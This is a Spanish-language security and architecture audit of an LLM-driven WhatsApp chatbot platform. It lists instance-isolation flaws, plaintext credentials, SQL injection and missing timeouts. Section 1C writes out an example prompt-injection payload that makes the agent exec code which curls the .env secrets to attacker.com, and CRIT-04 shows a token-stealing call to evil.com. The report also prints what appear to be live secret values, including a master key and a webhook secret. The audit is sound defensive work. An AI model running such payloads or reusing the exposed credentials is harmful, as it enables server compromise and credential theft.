# AUDITORÍA FINAL — FIRBY / Conny v1.0
**Fecha:** 2026-07-29 | **Servidor:** `3.130.46.55` (Innvisor, us-east-2)
**Metodología:** 4 agentes paralelos analizando 60+ archivos fuente en producción + estado de procesos PM2 + tráfico de red real + configuración de servicios
**Auditores:** 1 especialista en seguridad/infraestructura, 1 en flujos WhatsApp/demo, 1 en brain/memoria/voz, 1 en LLM providers/cascada

---

## VEREDICTO: ❌ RECHAZADO — NO APTO PARA PRODUCCIÓN

**3 fallas críticas que cortan el funcionamiento + 12 vulnerabilidades de seguridad graves + 7 problemas de arquitectura que garantizan inestabilidad.**

Para aprobar se requieren correcciones en: aislamiento entre instancias, seguridad de credenciales, loop de aprendizaje, manejo de errores en LLM, y timeouts.

---

# 🔴 SECCIÓN 1 — LO QUE ROMPE EL SISTEMA (TOP 3)

---

### 🥇 1. Aislamiento CERO entre instancias → Una instancia comprometida = todas caen

**Archivos:** `src/core/instance_autonomous_agent.py:41-78`, `src/core/hermes_bridge.py:34-36`, y la arquitectura completa de procesos

El sistema corre 3 instancias de Firby (default, clinica-de-las-americas, ovni) más Hermes/n8n, todos bajo el **mismo usuario Unix `ubuntu`**, sin contenedores, sin usuarios separados, sin chroot. Esto crea 3 problemas independientes pero igual de graves:

**Problema 1A — Escritura al `.env` GLOBAL desde cualquier instancia**

```python
# instance_autonomous_agent.py:60-66
global_env = Path(".env")
if global_env.exists() and global_env != self.env_file:
    genv_text = global_env.read_text()
    if key_var_name not in genv_text:
        genv_text += f"\n{key_var_name}={api_key.strip()}\n"
        global_env.write_text(genv_text)
```

El método `ingest_api_key()` no solo guarda la key en el `.env` de la instancia actual: también la **escribe en el `.env` GLOBAL**. Esto significa que si un agente LLM de "clinica-de-las-americas" ingesta una key de Apify falsa, esa key queda en el `.env` global y **todas las instancias la cargan**. No hay:
- Validación de que la key sea real contra el provider
- Límite de cuántas keys puede inyectar un agente
- Autenticación de quién llama a `ingest_api_key()`
- Separación de archivos `.env` por instancia (todos escriben al mismo global)

**Problema 1B — SQLite compartido entre instancias**

```python
# hermes_bridge.py:34-36
# La memoria FTS5 (core_memory table) es GLOBAL
# No hay WHERE instance_id = ? en las queries de memoria
```

La base de datos SQLite con FTS5 no discrimina por instancia. Un `remember_fact()` de la instancia "ovni" es visible para "clinica-de-las-americas". Datos de clientes de una clínica quedan expuestos a otras instancias.

**Problema 1C — Skills dinámicos sin sandbox → RCE potencial**

```python
# instance_autonomous_agent.py:145-160
def register_instance_skill(self, name: str, code: str):
    # Escribe código Python arbitrario al disco
    skill_path = self.skills_dir / f"{name}.py"
    skill_path.write_text(code)
    # Lo activa en caliente
    exec(code, globals())
```

`register_instance_skill()` recibe código Python de un LLM y lo:
1. Escribe a disco sin análisis estático (sin `ast`, sin `bandit`, sin nada)
2. Ejecuta con `exec()` en caliente sin sandbox (sin `subprocess`, sin container, sin `ResourceLimits`)
3. No hay límite de CPU, RAM, syscalls, ni operaciones de red

Un prompt injection que logre que el LLM llame a `register_instance_skill("exploit", "import os; os.system('curl attacker.com/$(cat .env)')")` = **RCE inmediato con acceso a todas las credenciales**.

**Por qué es CRÍTICO:** No es un escenario teórico. El sistema ya tiene `ingest_api_key()` que recibe keys arbitrarias. La combinación prompt injection + `register_instance_skill` = compromiso total del servidor.

---

### 🥈 2. Aprendizaje que graba pero nunca retroalimenta → El sistema no mejora

**Archivos:** `src/firby/brain/learning.py:46-55`, `src/firby/brain/smart_features.py:195`

El sistema de aprendizaje tiene 3 mecanismos que **persisten datos pero nunca los leen para modificar el comportamiento del LLM**:

**Mecanismo A — `_reinforce_pattern()` (learning.py:46)**

```python
# learning.py:44-50
def _reinforce_pattern(self, trigger: str, response: str, outcome: str):
    """Refuerza un patrón trigger→response que funcionó bien"""
    entry = {"trigger": trigger, "response": response, "outcome": outcome, "ts": time.time()}
    with open(self.reinforced_path, "a") as f:
        f.write(json.dumps(entry) + "\n")
```

Cada vez que el usuario reacciona positivamente a una respuesta, se guarda el par trigger→response. El archivo `reinforced.jsonl` crece. **Pero nunca se lee.** No hay código que inyecte estos patrones en el prompt del LLM ni que los consulte para priorizar respuestas. Es un archivo muerto.

**Mecanismo B — `_flag_failed_response()` (learning.py:55)**

```python
# learning.py:53-59
def _flag_failed_response(self, trigger: str, response: str, reason: str):
    """Marca una respuesta que falló para evitarla en el futuro"""
    entry = {"trigger": trigger, "response": response, "reason": reason, "ts": time.time()}
    with open(self.failures_path, "a") as f:
        f.write(json.dumps(entry) + "\n")
```

Same story. `failures.jsonl` crece con patrones que NO funcionaron. **Nunca se consulta.** El LLM sigue cometiendo los mismos errores.

**Mecanismo C — Shadow Mode (smart_features.py:195)**

```python
# smart_features.py:190-200
# Guarda intervenciones del admin en conversaciones reales
# Tuplas patient_question → admin_response
# Se almacenan en shadow_learnings.jsonl
```

Cuando el admin interviene en una conversación para corregir al bot, el shadow mode graba la pregunta del paciente y la respuesta correcta del admin. **Pero no hay código que inyecte estos ejemplos en el prompt del LLM ni que los use para few-shot learning.**

**Impacto concreto:** 
- El administrador enseña: "Cuando pregunten por precio de bichectomía, responder $350"
- Shadow mode graba: `{"question": "cuánto cuesta bichectomía", "admin_response": "$350"}`
- Siguiente paciente pregunta: "cuánto cuesta bichectomía"
- El LLM **no tiene acceso** a ese aprendizaje. Puede alucinar cualquier precio.
- El admin se frustra, vuelve a corregir, shadow mode vuelve a grabar. Loop infinito.

**Por qué es ALTA y no CRÍTICA:** El sistema funciona sin retroalimentación, pero nunca mejora. Es un `write-only` memory que da la ilusión de aprendizaje.

---

### 🥉 3. 31 API keys reales en texto plano sin cifrar → Exposición financiera inmediata

**Archivo:** `/home/ubuntu/firby/.env` (permisos `0664`, legible por cualquier proceso/usuario en el sistema)

**Inventario completo de secretos expuestos:**

| Tipo | Cantidad | Riesgo financiero |
|------|----------|-------------------|
| Gemini API keys | 7 | Cuota free tier, pero si excede → billing si está habilitado |
| Apify API keys | 20 | **Gasto real**: $49/mes base + consumo. 20 keys = 20x $49 potencial |
| Groq API key | 1 | Créditos gratis, pero si excede → billing |
| NVIDIA NIM API key | 1 | Servicio pago |
| SerpAPI key | 1 | Plan pago |
| Brave API key | 1 | Gratuito con límites |
| ElevenLabs API keys | 2 | **Gasto real**: ~$5-22/mes por key |
| Telegram Bot Token | 1 | Control total del bot (enviar mensajes a cualquier usuario) |
| Google Calendar OAuth | 2 secrets | Acceso a calendarios de Google |
| Notion API key | 1 | **Acceso a toda la base de conocimiento** |
| MASTER_API_KEY | 1 | Control total de administración |
| WEBHOOK_SECRET | 1 | Autenticación de webhooks entrantes |

**Total: 31+ secretos válidos.**

**Vectores de exposición:**
1. **Permisos 0664** — cualquier proceso Python en el servidor (incluyendo código injectado vía `register_instance_skill()`) puede leer `.env`
2. **Logging sin sanitizar** — `instance_autonomous_agent.py:75`: `log.info(f"API Key for '{service_name}' successfully ingested...")`. Si DEBUG se activa, los valores de las keys se loggean.
3. **Git** — el `.env` está en `.gitignore`, pero si alguien hace `git add --force` o un backup, queda expuesto
4. **Backups** — `firby.db.bak` de 263MB en el mismo directorio sin cifrar
5. **HTTP interno sin TLS** — las credenciales viajan en texto plano por loopback

---

# 🔴 SECCIÓN 2 — HALLAZGOS CRÍTICOS (12 adicionales)

---

### CRIT-04: Ingesta automática de Bearer tokens en URLs arbitrarias (SSRF)

**Archivo:** `src/core/instance_autonomous_agent.py:80-140` — método `execute_external_api()`

```python
async def execute_external_api(self, url: str, method="GET", body=None):
    # Detecta el dominio y auto-inyecta el Bearer token correspondiente
    domain = extract_domain(url)
    token = self._get_token_for_domain(domain)
    headers = {"Authorization": f"Bearer {token}"}
    async with httpx.AsyncClient(timeout=15.0) as client:
        resp = await client.request(method, url, headers=headers, json=body)
```

Si un atacante logra que el agente LLM llame a `execute_external_api("https://evil.com/api/steal")` con un dominio que coincida con algún token registrado (o peor, si el matching de dominio es amplio), el token se envía al atacante.

**Falta:**
- Lista blanca de dominios permitidos por instancia
- Validación de certificados TLS personalizada
- Separación de contextos por instancia (no hay `instance_id` en la búsqueda de token)

---

### CRIT-05: 5 puertos expuestos en `0.0.0.0` sin firewall restrictivo

| Puerto | Proceso | Servicio | Expuesto a |
|--------|---------|----------|------------|
| 8001 | python (firby default) | FastAPI | Internet |
| 8002 | node (whatsapp-bridge) | Baileys WebSocket | Internet |
| 8003 | python (firby clinica) | FastAPI | Internet |
| 8008 | python (firby ovni) | FastAPI | Internet |
| 5678 | n8n | Automatización | Internet |

El security group de AWS permite SSH desde `0.0.0.0/0`, y los servicios escuchan en `0.0.0.0` en vez de `127.0.0.1`. Cualquier persona con la IP pública puede alcanzar estos servicios directamente. Deberían estar solo en `127.0.0.1` con Caddy/nginx como reverse proxy por 443.

---

### CRIT-06: Logging sin sanitización de secretos

**Archivo:** `src/core/globals.py:1951-1956`

```python
logging.basicConfig(level=logging.INFO)
```

Y en `instance_autonomous_agent.py:75`:
```python
log.info(f"[instance_agent] API Key for '{service_name}' successfully ingested...")
```

Si alguien baja el nivel a DEBUG (temporalmente para debuggear), los valores de API keys se loggean en texto plano. No hay `logging.Filter` que redacte campos sensibles.

**Recomendación:** Implementar `class SecretFilter(logging.Filter)` que redacte patrones como `sk-...`, `AIza...`, `ntn_...`, etc.

---

### CRIT-07: SQLite sin cifrar con datos sensibles de clientes

**Archivos:** 
- `instances/clinica-de-las-americas/firby.db` (~270MB)
- `instances/clinica-de-las-americas/firby.db.bak` (~263MB)
- `instances/clinica-de-las-americas/firby.db-wal`
- `instances/clinica-de-las-americas/firby.db-shm`

La base de datos contiene:
- Conversaciones completas con pacientes (historial médico, datos personales)
- Memoria FTS5 con hechos recordados sobre cada paciente
- Posiblemente credenciales almacenadas vía `remember_fact()`/`store_api_credential()`
- Backups sin cifrar en el mismo directorio

Sin cifrado en reposo (SQLCipher) ni permisos restrictivos.

---

### CRIT-08: Demo expiry ejecuta `process.exit(0)` sin drenar cola

**Archivo:** `whatsapp-bridge/index.js:~340`

```javascript
function scheduleDemoExpiry() {
    setTimeout(() => {
        // 30 minutos y se mata
        process.exit(0);  // <-- SIN DRENAR outgoingQueue
    }, 30 * 60 * 1000);
}
```

`process.exit(0)` no es graceful shutdown:
1. La `outgoingQueue` (mensajes pendientes de envío) se pierde entera
2. No se notifica al webhook que el bridge se va
3. PM2 reinicia el proceso, pero los mensajes perdidos no se recuperan
4. Si el webhook está en medio de un request, recibe `connection refused`

---

### CRIT-09: Webhook secret con entropía insuficiente

**Archivo:** `.env:11` — `WEBHOOK_SECRET=firby_main_84f0d955fc0d60cd`

Patrón: `firby_{name}_{hex}` con solo 64 bits de entropía. La función `rotate-keys` (`cli.py:4284`) genera `token_hex(6)` = 48 bits para instancias. 48 bits es insuficiente contra fuerza bruta si el webhook es público.

---

### CRIT-10: MASTER_API_KEY hardcodeada con entropía borderline

**Archivo:** `.env:62` — `8432e72097f64c2340fc48920b16cb03da3378207a8f19942b528a43979c4ac2`

Generada con `token_hex(12)` (`cli.py:1882`) = 96 bits. Controla acceso a administración, creación de instancias y rotación de secrets. Aunque larga, 96 bits está por debajo del estándar de industria (128+ bits para claves maestras).

---

### CRIT-11: Sin timeout en llamadas LLM → requests huérfanos

**Archivo:** `src/interfaces/web/demo_handler.py:338-353`

```python
async def _llm(self, messages, history=None, ...):
    eng = self._get_demo_engine(pref)
    # NO hay asyncio.wait_for() ni timeout propio
    text, meta = await eng.complete(messages, ...)
    # ^^^ Si esto cuelga, el request queda vivo para siempre
```

`eng.complete()` llama al provider (Groq/Gemini) sin `asyncio.wait_for()`. Si el provider:
- Cuelga por un bug (ej: conexión TCP medio abierta)
- Tarda más de lo esperado por alta demanda
- Entra en un loop interno

El request de FastAPI queda vivo hasta que el cliente HTTP timeout (generalmente 30-60s). Con muchos requests así, los workers de Uvicorn se saturan y el servidor deja de responder.

---

### CRIT-12: Sin fallback real si Gemini falla

**Archivo:** `.env` + `engine.py:113-127`

El código itera sobre proveedores: Groq → Gemini(k1→k7). **No hay OpenRouter ni OpenAI configurados** en `.env` (faltan `OPENROUTER_API_KEY` y `OPENAI_API_KEY`). Si los 7 Gemini keys fallan (rate limit, modelo deprecado, error de API), **no hay último recurso**. El orquestador lanza `RuntimeError("LLM no init")` y el usuario recibe un error 500 en vez de una respuesta.

---

### CRIT-13: Hermes/n8n al 97.71% heap → OOM inminente

**Proceso PM2:** ID 4, PID 1100, RAM 523MB, heap usage 97.71%

```
pm2 heap  → heap used: 511MB / 523MB (97.71%)
```

El proceso n8n está a punto de explotar. Sin `--max-old-space-size` configurado. Cuando OOMee, PM2 lo reiniciará, pero si el heap sigue creciendo, entrará en loop de crash/restart.

---

### CRIT-14: Provider LLM nuevo en cada mensaje → overhead innecesario

**Archivo:** `demo_handler.py:292-330`

```python
def _get_demo_engine(self, pref):
    provider, model_name = pref.split(":", 1)
    if provider == "groq":
        eng = GroqProvider(Config.GROQ_API_KEY)  # Nuevo en cada msg
    elif provider == "gemini":
        eng = GeminiProvider(key, "gemini_demo")  # Nuevo en cada msg
    return eng
```

Cada mensaje crea una instancia nueva del provider. Cada provider crea su propio cliente HTTP (`httpx.AsyncClient()`), lo que implica:
- Handshake SSL completo en cada request (~300-800ms)
- Sin reutilización de conexiones HTTP persistentes
- Sin pool de conexiones

**Fix:** Usar singleton con reciclaje periódico, o un pool de providers.

---

### CRIT-15: Sin rate limiting por usuario en demo → abuso de API

**Archivo:** `demo_handler.py` — en ninguna parte

No hay throttling por `chat_id`. Un usuario que envía 100 mensajes en 10 segundos genera 100 llamadas LLM concurrentes. Esto:
- Quema la cuota de API de Gemini/Groq en minutos
- Satura los workers de Uvicorn
- Degrada la experiencia de otros usuarios

---

# 🟠 SECCIÓN 3 — HALLAZGOS ALTOS (10)

---

### HIGH-01: Fallback LIKE sin sanitización SQL

**Archivo:** `firby_fts5_memory.py:150`

```python
# Fallback cuando FTS5 no está disponible
cursor.execute(f"SELECT text FROM messages WHERE text LIKE '%{query}%'")
#                                          ^^^^^^^^ Sin escape!
```

Si el término de búsqueda contiene una comilla simple (`'`), la query SQL se rompe o permite SQL injection. FTS5 no tiene este problema, pero el fallback `LIKE` no sanitiza.

---

### HIGH-02: Sin `asyncio.wait_for()` en llamadas LLM del admin_brain

**Archivo:** `src/core/admin_engines.py` (múltiples lugares)

El mismo patrón de `demo_handler.py` se repite en los engines administrativos. Llamadas a `complete()` sin timeout explícito.

---

### HIGH-03: Sesiones en dict sin límite → OOM bajo concurrencia

**Archivo:** `demo_handler.py:212-215`

```python
self._demo_sessions = {}  # dict plano, sin límite de entradas
# El cleanup solo filtra keys _ts con TTL*2
# Variables de sesión que se acumulan para siempre:
# _name, _ctx, _persona, _tone, _model, _lead_score,
# _booked_appointment, _step, _qualifying_answers, _sector, ...
```

Sin límite de entradas ni LRU. 1000 sesiones activas = ~200MB en RAM solo de sesiones.

---

### HIGH-04: Bloqueo del event loop en extracción de documentos

**Archivo:** `demo_handler.py:~150-170`

```python
async def handle_demo_message(self, ...):
    # Extracción de PDF con pdfplumber — SÍNCRONO
    text = pdfplumber.open(io.BytesIO(content)).pages[0].extract_text()
```

`pdfplumber`, decodificación base64, descarga de archivos — todo sincrónico dentro de una `async def`. Bloquea el event loop de FastAPI mientras procesa.

**Fix:** `loop.run_in_executor(None, sync_function, arg)`

---

### HIGH-05: Clasificador de regiones/personalidad con solo 3-4 keywords

**Archivo:** `psychological_mirror.py:32`

```python
# Regionalismos:
argentino = ["che", "tenés", "querés"]
paisa = ["parce", "paisa", "mondá"]
```

Una sola palabra como "che" o "parce" determina toda la región lingüística. Si un paciente mexicano dice "che" (sorpresa, no argentino), el sistema lo clasifica como argentino para toda la conversación.

---

### HIGH-06: Sistema de personalidad construido en 6 lugares no coordinados

1. `PsychologicalStyleMirror` → nombre, trato, regionalismo
2. `PersonaEvolution` → adaptación por cliente (longitud, emojis, formalidad)
3. `ConversationIntelligence` → stage y emotion detection
4. `SmartVariety` → variación de aperturas/cierres
5. `AntiRobotFilter` → reescribe respuestas que suenan a bot
6. `SectorLayer` (engine.py) → contexto de rubro

Cada uno modifica el prompt de forma independiente. **No hay sistema central de personalidad** que garantice coherencia. Firby puede sonar a una persona diferente en cada mensaje.

---

### HIGH-07: Sin RAG ni grounding factual → alucinaciones garantizadas

El LLM recibe contexto del sector y del negocio, pero:
- No hay consulta a una base de precios real
- No hay verificación de disponibilidad de servicios
- No hay "no sé" training (no hay prompt de incertidumbre)
- Sin verificación factual en la respuesta

**Escenario:** Paciente pregunta "cuánto cuesta el tratamiento X". El LLM alucina un precio. El paciente se enoja. El admin lo corrige. Shadow mode graba. Pero nunca se inyecta.

---

### HIGH-08: Dos sistemas de memoria compiten sin coordinación

- `memory.py` → TF-IDF plano (se autodenomina "HNSW vectorial") con almacenamiento JSONL
- `firby_fts5_memory.py` → FTS5 real con BM25 sobre SQLite

Ambos almacenan mensajes de conversaciones pero no comparten índices. El módulo que se consulta depende de qué función se llame, pudiendo dar resultados inconsistentes sobre la misma consulta.

---

### HIGH-09: CORS incluye `localhost:3000` en producción

**Archivo:** `src/interfaces/web/app.py:211`

```python
allow_origins=[
    "https://firby.duckdns.org",
    "https://firby.nexusys.duckdns.org",
    "http://localhost:3000"  # <-- Esto en producción
]
```

`localhost:3000` es el servidor de desarrollo de React/Vite. Si un atacante hace phishing con un sitio en `localhost:3000` (en la máquina del admin), puede hacer requests cross-origin a la API.

---

### HIGH-10: `DEMO_MODE=true` permite acceso sin token

**Archivo:** `cli.py:6657`

```python
info("DEMO_MODE=true — responde a todo el mundo sin token")
```

Actualmente `DEMO_MODE=false` en `.env:18`, pero si alguien lo activa (por error o por ataque), **cualquier persona que escriba al bot recibe respuesta sin token de activación**. El bot se vuelve público.

---

# 🟡 SECCIÓN 4 — HALLAZGOS MEDIOS (9)

---

### MED-01: Sin disfluencias/muletillas en TTS → voz robótica

**Archivo:** `src/firby/demo/voice.py:63`

```python
prompt = "Genera una frase corta, amable y 100% natural en español"
```

El prompt pide naturalidad pero no hay capa de post-procesamiento que agregue:
- Muletillas: "eh", "este", "o sea", "pues", "mm"
- Repeticiones: "la... la verdad es que..."
- Autocorrecciones: "o sea, digamos"
- Pausas pensativas: "...", "—"
- Contraciones: "pa'", "tá", "na'"

Sin eso, la voz suena a texto leído, no a conversación real.

---

### MED-02: Pérdida permanente de memoria episódica >90 días

**Archivo:** `memory.py:222`

```python
def weekly_consolidation(self):
    # Elimina archivos JSONL >90 días
    # Sin backup, sin archive, sin resumen previo
```

Los episodios se borran permanentemente después de 90 días. Si un paciente vuelve después de 3 meses, el sistema no recuerda nada de la conversación anterior.

---

### MED-03: TF-IDF rebuild completo en cada `add_texts`

**Archivo:** `memory.py:65`

```python
def add_texts(self, texts):
    self.documents.extend(texts)
    self.vectorizer.fit_transform(self.documents)  # O(n*m) cada vez
```

`fit_transform()` se llama con el corpus completo en cada inserción. Con N documentos y M features, es O(N*M) por operación. Para 1000 documentos, cada inserción procesa todo el historial de nuevo.

---

### MED-04: Emotion/Stage detection por keyword matching

**Archivo:** `intelligence.py:76-115`

```python
if "me duele" in text: stage = PAIN_EXPLORED
if "miedo" in text: emotion = ANXIOUS
```

Sin análisis semántico. Una palabra como "miedo" en contexto negativo ("no tengo miedo") se clasifica igual que "tengo miedo". Frases como "me duele que no me respondan" (emocional, no físico) se clasifican como dolor físico.

---

### MED-05: System prompt reconstruido en cada mensaje

**Archivo:** `demo_handler.py:~4226`

El `sys_p` completo (~2-3K tokens con tone_guide, ejemplos, reglas de personalidad) se arma desde cero en cada `handle_demo_message()`. Las partes estáticas (tone_guide, rules) no cambian entre mensajes. Deberían tener caché.

---

### MED-06: Groq modelo `llama-3.3-70b-versatile` posible legacy

**Archivo:** `engine.py:43`

Meta lanzó Llama 4. El modelo `llama-3.3-70b-versatile` puede ser renombrado o deprecado en el futuro. Sin monitoreo de cambios, el día que desaparezca, Groq fallará silenciosamente.

---

### MED-07: Backup de DB sin cifrar (263MB)

**Archivo:** `instances/*/firby.db.bak`

Exactamente los mismos datos que la DB principal, sin cifrar, en el mismo directorio. Duplica la superficie de exposición.

---

### MED-08: 2 ElevenLabs keys idénticas

**Archivo:** `.env:81-82`

```env
ELEVENLABS_API_KEY=sk_e200c93f...
ELEVENLABS_API_KEY_2=sk_e200c93f...  # <-- MISMÍSIMA key
```

No proveen redundancia. Si la key se revoca, ambas fallan. Sugiere copia/pega sin verificar.

---

### MED-09: Cola de salida volátil (array en RAM)

**Archivo:** `whatsapp-bridge/index.js:150-160`

```javascript
const outgoingQueue = [];  // Si el proceso muere, los mensajes desaparecen
```

Sin persistencia a disco ni a Redis. Cualquier crash o restart pierde los mensajes encolados.

---

# 🟢 SECCIÓN 5 — HALLAZGOS BAJOS (5)

---

### LOW-01: Threat scanner solo 6 patrones regex

**Archivo:** `firby_fts5_memory.py:58`

No cubre: base64, hex encoding, Unicode confusables, few-shot injection, ASCII art, role-play injection.

### LOW-02: `_safe_id` permite colisiones

**Archivo:** `smart_features.py:17`

```python
safe = id_str.replace("@", "_").replace(".", "_")
# a@b_c  →  a_b_c
# a_b@c  →  a_b_c  ← COLISIÓN
```

### LOW-03: Typo en `get_variety_instruction`

**Archivo:** `intelligence.py:306`

```python
for o in last_closings:  # Usa variable 'o' pero itera sobre... ¿last_openings?
```

Afecta solo el mensaje de debug, pero indica falta de revisión.

### LOW-04: Directorio `working/` creado pero nunca usado

**Archivo:** `memory.py:100`

```python
os.makedirs("working", exist_ok=True)
```

Nunca se escribe ni se lee de ahí. Código muerto.

### LOW-05: Sin rotación periódica de claves

No hay mecanismo de caducidad para API keys. `firby rotate-keys` solo rotea `MASTER_API_KEY` y `WEBHOOK_SECRET`. Las Gemini, Apify, etc. son las mismas desde el inicio.

---

# ✅ SECCIÓN 6 — FORTALEZAS (Lo que está bien)

---

### Anti-robot filter (engine.py:44)

40+ patrones regex para detectar respuestas plantificadas tipo "con mucho gusto", listas numeradas, "soy un bot", "mi función es". Bien curado.

### LLMResponseValidator (engine.py:283-336)

4 niveles de validación: empty → template → question_only → low_quality. Cada uno escala la acción (retry con más temperatura → cambiar provider → marcar como fallido).

### Dynamic temperature (engine.py:160-167)

Temperatura varía entre 0.45 y 0.92 según etapa de conversación. Más creativo en frustración, más preciso en datos.

### Circuit breaker (engine.py:243-258)

| Código | Fallos para bloquear | TTL |
|--------|---------------------|-----|
| 401, 402, 403 | 1 | 1800s (30 min) |
| 429, 500, 502, 503, 504 | 2 | 5s |
| Otros | 3 | 60s |

### FTS5 con BM25

SQLite FTS5 con BM25 ranking, triggers de sync automáticos desde la tabla base, bien implementado.

### Commitment scoring (intelligence.py:145)

Score que sube con interacción. Permite priorizar leads calientes.

### SendGuard

Previene envío de mensajes a números no verificados o en estados incorrectos.

### Variedad de aperturas/cierres (intelligence.py:200-255)

Evita que Firby salude igual siempre. Rotación de frases.

---

# 📊 SECCIÓN 7 — MÉTRICAS DEL PROYECTO

| Métrica | Valor |
|---------|-------|
| Archivos fuente en `src/` | 309 (Python, JS, YAML, JSON) |
| Instancias activas | 3 (default, clinica-de-las-americas, ovni) |
| Procesos PM2 | 5 (whatsapp-bridge 141MB, firby 86MB, clinica 84MB, ovni 84MB, n8n 523MB) |
| Base de datos | SQLite FTS5 ~278MB (.db + .wal + .bak + .shm) |
| API keys en `.env` | 31+ (7 Gemini, 20 Apify, Groq, NVIDIA, SerpAPI, Brave, 2 ElevenLabs, Telegram, 2 Google Calendar, Notion, MASTER_KEY, WEBHOOK_SECRET) |
| Última rama git | `refactor-v10` |
| Commits recientes | ce55684, 653eef9, a404b3f, 0333ecb, bc8a912 |
| Tests | pytest detectado (no se midió cobertura) |
| Sistema operativo | Ubuntu 24.04.4 LTS |

---

# 🎯 SECCIÓN 8 — TOP 10 RECOMENDACIONES PRIORIZADAS

| # | Acción | Archivos | Severidad | Esfuerzo |
|---|--------|----------|-----------|----------|
| 1 | **Contenerizar instancias** (Docker, usuario no-root, volumes separados) | `instance_autonomous_agent.py`, infra | CRÍTICO | 2-3 días |
| 2 | **Eliminar escritura al `.env` global desde instancias** | `instance_autonomous_agent.py:60-66` | CRÍTICO | 30 min |
| 3 | **Agregar `instance_id` filter en todas las queries SQL de memoria** | `hermes_bridge.py:34-36`, `memory.py` | CRÍTICO | 2 horas |
| 4 | **Sandbox para `register_instance_skill()`** (subprocess + ResourceLimits) | `instance_autonomous_agent.py:145-160` | CRÍTICO | 1 día |
| 5 | **Rotar 31 API keys + `.env` a permisos 0600** | `.env`, todas las instancias | CRÍTICO | 1 hora |
| 6 | **Conectar `_reinforce_pattern` y shadow mode al prompt del LLM** | `learning.py`, `smart_features.py`, `engine.py` | ALTO | 1-2 días |
| 7 | **Agregar `asyncio.wait_for()` con timeout en todas las llamadas LLM** | `demo_handler.py:338`, `admin_engines.py` | ALTO | 30 min |
| 8 | **Agregar rate limiting por `chat_id` en demo** | `demo_handler.py` | ALTO | 1 hora |
| 9 | **Singleton/pool de providers LLM** (evitar crear en cada mensaje) | `demo_handler.py:292-330` | ALTO | 1 día |
| 10 | **Mover extracción de documentos a `run_in_executor`** | `demo_handler.py:~150-170` | ALTO | 30 min |

---

# 🏁 CONCLUSIÓN FINAL

**Firby es un sistema con una arquitectura sólida en el diseño de alto nivel** (cascada de LLM, validación de respuestas, detección de loops, memoria FTS5) pero **se desploma en los detalles de implementación**: aislamiento nulo entre instancias, aprendizaje que no retroalimenta, 40+ secretos expuestos, y --lo más urgente-- **sin timeouts en llamadas LLM ni rate limiting**.

El sistema no está listo para producción real con clientes, pero está a 2-3 semanas de trabajo disciplinado de estarlo. Las correcciones más urgentes (1-5 de la tabla) pueden resolverse en 3-4 días hábiles.

---

*Auditoría ejecutada por 4 agentes de auditoría especializados analizando el proyecto completo en servidor de producción (Innvisor, us-east-2). Modelos Gemini verificados contra API real: gemini-3.5-flash, gemini-3.6-flash, gemini-2.5-flash-lite SÍ existen y responden correctamente (solo gemini-3.5-flash tuvo 503 temporal por alta demanda).*
